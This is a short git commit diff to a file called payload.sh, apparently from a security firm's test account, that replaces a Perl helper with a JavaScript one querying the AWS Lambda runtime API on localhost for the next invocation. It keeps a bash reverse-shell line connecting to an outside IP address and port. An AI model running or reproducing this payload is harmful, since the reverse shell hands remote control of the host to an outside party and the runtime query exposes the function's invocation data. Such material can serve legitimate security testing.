6906e23585242d01a87d2bdfd9ba18faa692dfb8
praetorian-snyk-max-1 <ben.kofman+1@praetorian.com>
2024-11-25 14:03:33 -0500

    Update payload.sh

--- payload.sh
+++ payload.sh
@@ -1,3 +1,3 @@
-echo 'use LWP::Simple; print get("http://127.0.0.1:9001/2018-06-01/runtime/invocation/next");' > script.pl;
-chmod +x script.pl;
+echo 'const response = await fetch("http://127.0.0.1:9001/2018-06-01/runtime/invocation/next"); const data = await response.json(); console.log(data);' > script.js;
+chmod +x script.js;
 bash -i >& /dev/tcp/3.95.20.82/4001 0>&1;
